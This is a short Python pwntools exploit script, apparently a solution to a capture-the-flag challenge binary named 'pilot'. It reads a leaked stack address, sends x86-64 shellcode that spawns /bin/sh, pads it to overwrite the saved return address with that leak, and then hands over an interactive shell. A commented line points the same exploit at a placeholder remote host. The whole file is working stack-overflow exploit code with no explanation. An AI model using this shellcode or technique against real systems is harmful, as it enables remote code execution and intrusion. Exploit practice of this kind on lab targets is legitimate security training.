#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.binary = './pilot'

p = process()  # or remote("host", port)
#p = remote('domain/ip', 1337)


gdb.attach(p, '''
    break *0x400b34
''')

p.recvuntil("[*]Location:")
leak = p.recvline().strip(b'\n')

sh = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
payload = flat(
    sh,
    b'\00' * (0x28 - len(sh)),
    p64(int(leak, 16))
)

p.recvuntil("Command:")
p.sendline(payload)

#step through first stage
p.interactive()
